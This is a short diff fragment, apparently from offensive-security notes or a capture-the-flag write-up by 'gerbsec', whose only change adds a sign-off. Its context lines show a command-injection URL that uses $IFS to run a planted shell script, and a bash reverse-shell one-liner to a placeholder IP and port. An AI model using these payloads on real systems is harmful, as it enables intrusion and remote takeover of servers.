@@ -32,3 +32,5 @@ http://ip/$('bash'$IFS'/var/www/html/shell.sh')
 
 bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'
 ```
+
+best, gerbsec
